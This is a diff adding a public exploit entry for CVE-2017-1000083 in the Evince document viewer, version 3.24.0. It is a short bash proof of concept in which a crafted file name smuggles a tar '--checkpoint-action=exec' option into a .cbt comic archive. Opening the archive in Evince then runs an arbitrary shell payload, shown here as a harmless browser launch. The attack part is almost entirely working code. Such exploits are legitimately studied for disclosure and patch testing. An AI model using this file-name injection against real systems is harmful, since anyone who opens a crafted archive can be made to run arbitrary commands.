@@ -1,0 +1,22 @@
+# Exploit Title: evince command line injection
+# Date: 2017-09-05
+# Exploit Author: Matlink
+# Vendor Homepage: https://wiki.gnome.org/Apps/Evince
+# Software Link: https://wiki.gnome.org/Apps/Evince
+# Version: 3.24.0
+# Tested on: Debian sid
+# CVE : CVE-2017-1000083
+
+Can be tested on docker with https://github.com/matlink/evince-cve-2017-1000083
+
+#! /bin/bash
+
+# define the payload
+export PAYLOAD="firefox google.com"
+
+# Create the malicious .cbt file
+dd if=/dev/zero of=" --checkpoint-action=exec=bash -c '$PAYLOAD;'.jpg" bs=1 count=512000
+tar cvf poc.cbt *.jpg
+
+# Run the malicious file
+evince poc.cbt
